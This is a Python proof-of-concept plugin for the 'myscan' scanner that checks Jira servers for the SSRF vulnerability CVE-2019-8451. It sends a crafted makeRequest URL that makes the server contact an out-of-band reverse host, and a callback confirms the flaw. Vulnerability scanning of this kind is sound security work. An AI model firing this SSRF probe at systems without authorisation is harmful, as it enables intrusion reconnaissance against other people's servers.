#!/usr/bin/env python3
# @Time    : 2020-05-04
# @Author  : caicai
# @File    : poc_jira-ssrf-cve-2019-8451_2019.py

from myscan.lib.parse.response_parser import response_parser
from myscan.config import scan_set
from myscan.lib.core.common_reverse import generate_reverse_payloads, query_reverse
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "jira ssrf"
        self.vulmsg = "referer: https://jira.atlassian.com/browse/JRASERVER-69793"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        url = "{protocol}://{host}:{port}".format(**self.dictdata.get("url"))
        reverse_url, reverse_data = generate_reverse_payloads("jira_ssrf")
        reverse_url = reverse_url[0].split(" ")[1]
        req = {
            "method": "GET",
            "headers": {
                "X-Atlassian-Token": "no-check",
            },
            "url": self.url + "plugins/servlet/gadgets/makeRequest?url={}@{}".format(url, reverse_url),
            "allow_redirects": True,
            "verify": False,
            "timeout": 10
        }
        r = request(**req)
        if r != None and b"don't be evil" in r.content:
            res, res_data = query_reverse(reverse_data)
            if res:
                parser_ = response_parser(r)
                self.result.append({
                    "name": self.name,
                    "url": self.url,
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "request": parser_.getrequestraw(),
                        "response": parser_.getresponseraw()
                    }
                })
